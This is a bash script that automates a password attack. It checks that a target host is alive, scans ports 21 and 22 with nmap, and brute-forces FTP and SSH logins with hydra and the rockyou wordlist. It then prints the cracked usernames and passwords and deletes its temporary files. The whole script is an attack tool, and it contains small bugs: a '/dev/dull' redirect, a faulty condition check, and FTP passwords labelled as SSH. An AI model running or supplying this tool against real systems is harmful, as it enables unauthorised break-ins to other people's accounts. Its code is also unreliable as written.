#!/bin/bash 
read -p "enter IP or domain : " ip
#function to identify the target system is alive or not
live()
{
    if ping -c 1 -W 1 "$ip" > /dev/null; then
       echo "$ip is connnected"
       else
        echo "$ip is not connected"
        exit
    fi  
}
#function to scan port 21 and 22 using nmap
scan()
{
    nmap -sS -p 21 $ip -oN tmp_ftp_scan.txt > /dev/null 
    ftp_stat=$(cat tmp_ftp_scan.txt | grep open | cut -d " " -f 1)
    echo $ftp_stat 
    nmap -sS -p 22 $ip -oN tmp_ssh_scan.txt > /dev/null
    ssh_stat=$(cat tmp_ssh_scan.txt | grep open | cut -d " " -f 1)
    echo $ssh_stat 
}
echo "enter the path to custom wordlist or for defult press enter"
read path
if [ ! -z $path ]; then
wordlist=$path
else wordlist=/usr/share/wordlists/rockyou.txt
fi
#function to crack FTP & SSH password using hydra 
crack()
{
    if [[ ! -z "$ftp_stat" && "$ssh_stat" ]]; then
       echo "FTP and SSH open"
       echo "cracking FTP and SSH password"
       hydra -I -t 1 -L $wordlist -P $wordlist $ip ssh -o tmp_ssh_pass.txt > /dev/null 
       hydra -I -t 1 -L $wordlist -P $wordlist $ip ftp -o tmp_ftp_pass.txt > /dev/null
      elif [ ! -z "$ftp_stat" ]; then
         echo "FTP is open"
        hydra -I -t 1 -L $wordlist -P $wordlist $ip ftp -o tmp_ftp_pass.txt > /dev/null
     
      elif [ ! -z "$ssh_stat" ]; then
         echo "SSH is open"
        hydra -I -t 1 -L $wordlist -P $wordlist $ip ssh -o tmp_ssh_pass.txt > /dev/dull
    else
       echo "FTP and SSH closed"
       exit
    fi
}
#function to show cracked user name and password
show()
{
    ssh_file=tmp_ssh_pass.txt
    ftp_file=tmp_ftp_pass.txt
    if [ -f "$ssh_file" ]; then
    ssh_username=$(cat tmp_ssh_pass.txt | grep login | cut -d " " -f 7)
    echo  -e "cracked SSH username are;  '\033[1m$ssh_username\033[0m'"
    ssh_password=$(cat tmp_ssh_pass.txt | grep login | cut -d " " -f 11)
    echo  -e "cracked SSH password are;  '\033[1m$ssh_password\033[0m'"
    fi
     if [ -f "$ftp_file" ]; then
    ftp_username=$(cat tmp_ftp_pass.txt | grep login | cut -d " " -f 7)
    echo -e "cracked ftp username are; '\033[1m$ftp_username\033[0m'"
    ftp_password=$(cat tmp_ftp_pass.txt | grep login | cut -d " " -f 11)
    echo -e "cracked SSH password are; '\033[1m$ftp_password\033[0m'"
    fi
}
#function to remove tmp file which are created
trash()
{
rm tmp_ftp_scan.txt
rm tmp_ssh_scan.txt
rm tmp_ftp_pass.txt
rm tmp_ssh_pass.txt
}
#function to remove restore file of hydra
remove()
{
    if [ -f hydra.restore ]; then
    rm hydra.restore
    echo "restore file removed"
    fi
}#calling all functions
remove
live
scan
crack
show
trash
